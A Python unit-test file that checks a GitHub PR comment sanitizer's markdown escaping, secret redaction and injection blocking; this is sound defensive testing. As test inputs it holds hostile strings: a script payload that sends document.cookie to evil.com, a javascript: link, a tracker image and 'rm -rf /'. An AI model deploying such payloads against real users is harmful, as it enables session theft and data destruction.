"""Unit tests for GitHub PR comment sanitization."""

from __future__ import annotations

from kekkai.github.sanitizer import (
    escape_markdown,
    redact_secrets,
    sanitize_for_comment,
)


class TestEscapeMarkdown:
    """Tests for escape_markdown function."""

    def test_escape_backticks(self) -> None:
        """Backticks are escaped."""
        result = escape_markdown("Use `rm -rf /`")
        assert "\\`" in result
        # The backtick is escaped, making markdown code block inactive
        assert result.count("\\`") == 2

    def test_escape_asterisks(self) -> None:
        """Asterisks are escaped."""
        result = escape_markdown("This is **bold** text")
        assert "\\*\\*bold\\*\\*" in result

    def test_escape_underscores(self) -> None:
        """Underscores are escaped."""
        result = escape_markdown("This is _italic_ text")
        assert "\\_italic\\_" in result

    def test_escape_square_brackets(self) -> None:
        """Square brackets are escaped."""
        result = escape_markdown("[link](http://evil.com)")
        assert "\\[link\\]" in result
        assert "](http://evil.com)" not in result

    def test_escape_hash_signs(self) -> None:
        """Hash signs are escaped."""
        result = escape_markdown("# Heading")
        assert "\\# Heading" in result

    def test_remove_html_tags(self) -> None:
        """HTML tags are removed."""
        result = escape_markdown("<script>alert('xss')</script>")
        assert "<script>" not in result
        assert "</script>" not in result

    def test_truncate_long_text(self) -> None:
        """Long text is truncated."""
        long_text = "A" * 3000
        result = escape_markdown(long_text)
        assert len(result) <= 2003  # 2000 + "..."
        assert result.endswith("...")

    def test_empty_string(self) -> None:
        """Empty string returns empty."""
        assert escape_markdown("") == ""

    def test_normal_text_unchanged(self) -> None:
        """Normal text without special chars passes through."""
        result = escape_markdown("Hello World 123")
        # Backslash escapes may be added but content preserved
        assert "Hello" in result
        assert "World" in result


class TestRedactSecrets:
    """Tests for redact_secrets function."""

    def test_redact_aws_key(self) -> None:
        """AWS access keys are redacted."""
        result = redact_secrets("Key: AKIAIOSFODNN7EXAMPLE")
        assert "AKIAIOSFODNN7EXAMPLE" not in result
        assert "REDACTED" in result

    def test_redact_bearer_token(self) -> None:
        """Bearer tokens are redacted."""
        result = redact_secrets("Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9")
        assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" not in result
        assert "REDACTED" in result

    def test_redact_jwt(self) -> None:
        """JWT tokens are redacted."""
        jwt = (
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            "eyJzdWIiOiIxMjM0NTY3ODkwIn0."
            "dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        )
        result = redact_secrets(f"Token: {jwt}")
        assert jwt not in result
        assert "JWT_REDACTED" in result

    def test_redact_github_token(self) -> None:
        """GitHub tokens are redacted."""
        result = redact_secrets("Token: ghp_1234567890abcdefghijklmnopqrstuvwxyz12")
        assert "ghp_1234567890" not in result
        assert "GITHUB_TOKEN_REDACTED" in result

    def test_redact_api_key_value(self) -> None:
        """API key values are redacted."""
        result = redact_secrets("api_key=sk_live_abcdefghijklmnop123456")
        assert "sk_live_abcdefghijklmnop123456" not in result
        assert "REDACTED" in result

    def test_redact_password_value(self) -> None:
        """Password values are redacted."""
        result = redact_secrets("password: supersecretpassword123")
        assert "supersecretpassword123" not in result
        assert "REDACTED" in result

    def test_redact_long_hex_string(self) -> None:
        """Long hex strings (potential secrets) are redacted."""
        hex_secret = "a" * 40 + "b" * 10  # 50 char hex
        result = redact_secrets(f"Secret: {hex_secret}")
        assert hex_secret not in result

    def test_preserves_short_hex(self) -> None:
        """Short hex strings are preserved (commit SHAs, etc)."""
        short_hex = "abc123"
        result = redact_secrets(f"Commit: {short_hex}")
        assert short_hex in result

    def test_empty_string(self) -> None:
        """Empty string returns empty."""
        assert redact_secrets("") == ""

    def test_normal_text_unchanged(self) -> None:
        """Normal text without secrets passes through."""
        result = redact_secrets("This is normal text without any secrets")
        assert result == "This is normal text without any secrets"


class TestSanitizeForComment:
    """Tests for sanitize_for_comment function."""

    def test_combines_redaction_and_escaping(self) -> None:
        """Sanitization redacts secrets then escapes markdown."""
        text = "API key: AKIAIOSFODNN7EXAMPLE in `config.py`"
        result = sanitize_for_comment(text)

        # Secret redacted
        assert "AKIAIOSFODNN7EXAMPLE" not in result
        # Markdown escaped
        assert "\\`" in result or "`config.py`" not in result

    def test_order_is_redact_then_escape(self) -> None:
        """Redaction happens before escaping."""
        # If escape happened first, the secret might be broken into
        # escaped pieces that don't match the pattern
        text = "secret=`mysupersecretpassword123`"
        result = sanitize_for_comment(text)

        # The secret should still be redacted even with backticks
        assert "mysupersecretpassword123" not in result


class TestMarkdownInjectionPrevention:
    """Tests for preventing various markdown injection attacks."""

    def test_prevent_link_injection(self) -> None:
        """Links in untrusted content are broken."""
        malicious = "[Click here](javascript:alert('xss'))"
        result = escape_markdown(malicious)
        assert "](javascript:" not in result

    def test_prevent_image_injection(self) -> None:
        """Image tags are broken."""
        malicious = "![](http://evil.com/tracker.gif)"
        result = escape_markdown(malicious)
        assert "![" not in result or "\\!\\[" in result

    def test_prevent_heading_injection(self) -> None:
        """Heading injection is prevented."""
        malicious = "# Fake Heading\n\nEvil content"
        result = escape_markdown(malicious)
        assert "# Fake" not in result or "\\# Fake" in result

    def test_prevent_code_block_injection(self) -> None:
        """Code block injection is prevented."""
        malicious = "```\nmalicious code\n```"
        result = escape_markdown(malicious)
        assert "```" not in result or "\\`\\`\\`" in result

    def test_prevent_html_script_injection(self) -> None:
        """HTML script tags are removed."""
        malicious = "<script>document.location='http://evil.com?c='+document.cookie</script>"
        result = escape_markdown(malicious)
        assert "<script>" not in result
        assert "</script>" not in result
        assert "document.cookie" not in result or ">" not in result
